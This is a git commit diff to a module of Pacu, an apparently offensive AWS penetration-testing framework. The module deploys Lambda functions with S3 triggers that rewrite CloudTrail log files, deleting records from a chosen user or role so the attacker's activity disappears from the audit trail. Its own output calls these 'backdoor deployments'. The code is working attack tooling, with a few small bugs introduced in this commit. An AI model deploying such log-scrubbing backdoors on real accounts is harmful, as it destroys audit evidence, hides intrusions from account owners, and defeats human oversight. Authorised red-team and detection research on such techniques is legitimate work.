13dd588d63518d205ea0f81a5f896a3b7817e351
Spencer Gietzen <spencer@spengietz.com>
2018-10-02 14:12:04 -0700

    completed lambda__intercept_cloudtrail_logs for the most part. modified .gitignore

--- modules/lambda__intercept_cloudtrail_logs/main.py
+++ modules/lambda__intercept_cloudtrail_logs/main.py
@@ -17,7 +17,7 @@ module_info = {
 
     'one_liner': 'Creates a Lambda function and S3 event trigger to scrub CloudTrail logs of our own logs.',
 
-    'description': 'This module creates a new Lambda function and an accompanying S3 event trigger that will trigger upon a new file being put into any buckets you specify. The Lambda function will determine if the file that was placed in the bucket is a CloudTrail log file, and if it is, it will download it, then remove any "AccessDenied" logs related to the Lambda function and any logs coming from the user/role name you specify. It will then re-upload that file ontop of the old one. Note: An IAM role that has the S3 GetObject and S3 PutObject permissions is required to be attached to the Lambda function when it is created.',
+    'description': 'This module creates a new Lambda function and an accompanying S3 event trigger that will trigger upon a new file being put into any buckets you specify. The Lambda function will determine if the file that was placed in the bucket is a CloudTrail log file, and if it is, it will download it, then remove any "AccessDenied" logs related to the Lambda function and any logs coming from the user/role name you specify. It will then re-upload that file ontop of the old one. Note: An IAM role that has the S3 GetObject and S3 PutObject permissions is required to be attached to the Lambda function when it is created. Note: If you specify multiple buckets in more than one region, a Lambda function will be created in each of those regions, because the Lambda function and corresponding S3 trigger must be in the same region.',
 
     'services': ['Lambda', 'S3', 'IAM'],
 
@@ -25,15 +25,14 @@ module_info = {
 
     'external_dependencies': [],
 
-    'arguments_to_autocomplete': ['--role-arn', '--buckets', '--user-names', '--role-names', '--cleanup'],
+    'arguments_to_autocomplete': ['--buckets', '--user-name', '--role-name', '--cleanup'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
-parser.add_argument('--role-arn', required=False, default=None, help='The ARN of the role to attach to the Lambda function that gets created. Must have S3 GetObject and S3 PutObject permissions.')
-parser.add_argument('--buckets', required=True, help='The S3 bucket(s) to target. An event trigger will be added to each bucket and for every item that is put into that bucket, our Lambda function will be invoked. These buckets should be where CloudTrail trails are saving their logs in the account.')
-parser.add_argument('--user-names', required=False, default=None, help='The user names of any users that you want to remove logs for. The Lambda function will delete any logs from the CloudTrail output that originate from these users. One of either this argument or --role-name is required.')
-parser.add_argument('--role-names', required=False, default=None, help='The role names of any roles that you want to remove logs for. The Lambda function will delete any logs from the CloudTrail output that originate from these roles. One of either this argument or --user-name is required.')
+parser.add_argument('--buckets', required=True, help='Comma-separated list of the S3 bucket(s) and their regions to target in the format bucket_name@region. An event trigger will be added to each bucket and for every item that is put into that bucket, our Lambda function will be invoked. These buckets should be where CloudTrail trails are saving their logs in the account.')
+parser.add_argument('--user-name', required=False, default=None, help='The user name of the user that you want to remove logs for. The Lambda function will delete any logs from the CloudTrail output that originate from this user. One or both of either this argument or --role-name is required.')
+parser.add_argument('--role-name', required=False, default=None, help='The role name of the role that you want to remove logs for. The Lambda function will delete any logs from the CloudTrail output that originate from this role. One or both of either this argument or --user-name is required.')
 parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known CloudTrail interceptors that the module added from the account.')
 
 
@@ -85,16 +84,26 @@ def main(args, pacu_main):
         if created_s3_triggers:
             delete_s3_file = True
             for trigger in created_s3_triggers:
-                name = trigger.rstrip()
+                bucket_name, bucket_region, trigger_id = trigger.rstrip().split('@')
                 print('  Deleting S3 trigger {}...'.format(name))
-                client = pacu_main.get_boto3_client('events', 'us-east-1')
+                client = pacu_main.get_boto3_client('s3', bucket_region)
                 try:
-                    client.remove_targets(
-                        Rule=name,
-                        Ids=['0']
+                    response = client.get_bucket_notification_configuration(
+                        Bucket=bucket_name
                     )
-                    client.delete_rule(
-                        Name=name
+
+                    print(response)
+
+                    for i in range(0, len(response['LambdaFunctionConfigurations'])):
+                        if response['LambdaFunctionConfigurations'][i]['Id'] == trigger_id:
+                            del response['LambdaFunctionConfigurations'][i]
+                            break
+
+                    print(response)
+
+                    client.put_bucket_notification_configuration(
+                        Bucket=bucket_name,
+                        NotificationConfiguration=response
                     )
                 except ClientError as error:
                     code = error.response['Error']['Code']
@@ -113,15 +122,15 @@ def main(args, pacu_main):
         print('Completed cleanup mode.\n')
         return {'cleanup': True}
 
-    if not args.exfil_url:
-        print('  --exfil-url is required if you are not running in cleanup mode!')
+    if not args.user_name and not args.role_name:
+        print('  One or both of either --user-name or --role-name is required if you are not running in cleanup mode!')
         return
 
-    data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}
+    data = {'functions_created': 0, 'triggers_created': 0, 'successes': 0}
 
-    created_resources = {'LambdaFunctions': [], 'CWERules': []}
+    created_resources = {'LambdaFunctions': [], 'S3Triggers': []}
 
-    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the IAM CreateAccessKey permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
+    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the S3 GetObject and S3 PutObject permissions. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
     if not target_role_arn:
         if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
             print('Pre-req module not run successfully. Exiting...')
@@ -138,7 +147,15 @@ def main(args, pacu_main):
     with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
         code = f.read()
 
-    code = code.replace('POST_URL', args.exfil_url)
+    if args.user_name:
+        code = code.replace('USER_PLACEHOLDER', "if log_record['userIdentity']['type'] == 'IAMUser' and log_record['userIdentity']['userName'] == '{}':\n                    continue\n".format(args.user_name))
+    else:
+        code = code.replace('USER_PLACEHOLDER', '')
+
+    if args.role_name:
+        code = code.replace('ROLE_PLACEHOLDER', "if log_record['userIdentity']['type'] == 'AssumedRole' and log_record['userIdentity']['sessionContext']['sessionIssuer']['userName'] == '{}':\n                    continue".format(args.role_name))
+    else:
+        code = code.replace('ROLE_PLACEHOLDER', '')
 
     with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
         f.write(code)
@@ -154,83 +171,91 @@ def main(args, pacu_main):
     with open('./modules/{}/lambda_function.zip'.format(module_info['name']), 'rb') as f:
         zip_file_bytes = f.read()
 
-    client = pacu_main.get_boto3_client('lambda', 'us-east-1')
+    regions = []
+    buckets = []
+    for bucket in args.buckets.split(','):
+        bucket, region = bucket.split('@')
+        regions.append(region)
+        buckets.append(buckets)
+    regions = list(set(regions))
 
-    try:
-        function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
-        response = client.create_function(
-            FunctionName=function_name,
-            Runtime='python3.6',
-            Role=target_role_arn,
-            Handler='lambda_function.lambda_handler',
-            Code={
-                'ZipFile': zip_file_bytes
-            }
-        )
-        lambda_arn = response['FunctionArn']
-        print('  Created Lambda function: {}'.format(function_name))
-        data['functions_created'] += 1
-        created_resources['LambdaFunctions'].append(function_name)
+    for region in regions:
+        client = pacu_main.get_boto3_client('lambda', region)
+        print('  Starting region {}...'.format(region))
 
-        client = pacu_main.get_boto3_client('events', 'us-east-1')
-
-        response = client.put_rule(
-            Name=function_name,
-            EventPattern='{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["iam.amazonaws.com"],"eventName":["CreateUser"]}}',
-            State='ENABLED'
-        )
-        print('  Created CloudWatch Events rule: {}'.format(response['RuleArn']))
-        data['rules_created'] += 1
-
-        client = pacu_main.get_boto3_client('lambda', 'us-east-1')
-
-        client.add_permission(
-            FunctionName=function_name,
-            StatementId=''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)),
-            Action='lambda:InvokeFunction',
-            Principal='events.amazonaws.com',
-            SourceArn=response['RuleArn']
-        )
-
-        client = pacu_main.get_boto3_client('events', 'us-east-1')
-
-        response = client.put_targets(
-            Rule=function_name,
-            Targets=[
-                {
-                    'Id': '0',
-                    'Arn': lambda_arn
+        try:
+            function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
+            response = client.create_function(
+                FunctionName=function_name,
+                Runtime='python3.6',
+                Role=target_role_arn,
+                Handler='lambda_function.lambda_handler',
+                Code={
+                    'ZipFile': zip_file_bytes
                 }
-            ]
-        )
-        if response['FailedEntryCount'] > 0:
-            print('Failed to add the Lambda function as a target to the CloudWatch rule. Failed entries:')
-            print(response['FailedEntries'])
-        else:
-            print('  Added Lambda target to CloudWatch Events rule.')
-            data['successes'] += 1
-            created_resources['CWERules'].append(function_name)
-    except ClientError as error:
-        code = error.response['Error']['Code']
-        if code == 'AccessDeniedException':
-            print('  FAILURE: MISSING NEEDED PERMISSIONS')
-        else:
-            print(code)
+            )
+            lambda_arn = response['FunctionArn']
+            print('    Created Lambda function: {}'.format(function_name))
+            data['functions_created'] += 1
+            created_resources['LambdaFunctions'].append('{}@{}'.format(function_name, region))
+
+            client = pacu_main.get_boto3_client('s3', region)
+
+            for bucket in args.buckets.split(','):
+                bucket_name, bucket_region = bucket.split('@')
+
+                if region == bucket_region:
+                    response = client.get_bucket_notification_configuration(
+                        Bucket=bucket_name
+                    )
+                    response['LambdaFunctionConfigurations'].append({
+                        'Id': function_name,
+                        'LambdaFunctionArn': lambda_arn,
+                        'Events': [
+                            's3:ObjectCreated:*'
+                        ]
+                    })
+                    client.put_bucket_notification_configuration(
+                        Bucket=bucket_name,
+                        NotificationConfiguration=response
+                    )
+                    print('    Created S3 event trigger for bucket: {}'.format(bucket_name))
+                    data['triggers_created'] += 1
+
+                    client = pacu_main.get_boto3_client('lambda', region)
+
+                    active_aws_key = session.get_active_aws_key(pacu_main.database)
+
+                    client.add_permission(
+                        FunctionName=function_name,
+                        StatementId=''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)),
+                        Action='lambda:InvokeFunction',
+                        Principal='s3.amazonaws.com',
+                        SourceArn='arn:aws:s3:::{}'.format(bucket_name),
+                        SourceAccount=active_aws_key.account_id if active_aws_key.account_id else None
+                    )
+
+                    data['successes'] += 1
+                    created_resources['S3Triggers'].append('{}@{}@{}'.format(bucket_name, region, function_name))
+        except ClientError as error:
+            code = error.response['Error']['Code']
+            if code == 'AccessDeniedException':
+                print('    FAILURE: MISSING NEEDED PERMISSIONS')
+            else:
+                print(code)
 
     if created_resources['LambdaFunctions']:
         with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'w+') as f:
             f.write('\n'.join(created_resources['LambdaFunctions']))
-    if created_resources['CWERules']:
-        with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'w+') as f:
-            f.write('\n'.join(created_resources['CWERules']))
-
-    print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.')
+    if created_resources['S3Triggers']:
+        with open('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']), 'w+') as f:
+            f.write('\n'.join(created_resources['S3Triggers']))
 
     return data
 
 
 def summary(data, pacu_main):
     if data.get('cleanup'):
-        return '  Completed cleanup of Lambda functions and CloudWatch Events rules.'
+        return '  Completed cleanup of Lambda functions and S3 event triggers.'
 
-    return '  Lambda functions created: {}\n  CloudWatch Events rules created: {}\n  Successful backdoor deployments: {}\n'.format(data['functions_created'], data['rules_created'], data['successes'])
+    return '  Lambda functions created: {}\n  S3 event triggers created: {}\n  Successful backdoor deployments: {}\n'.format(data['functions_created'], data['triggers_created'], data['successes'])
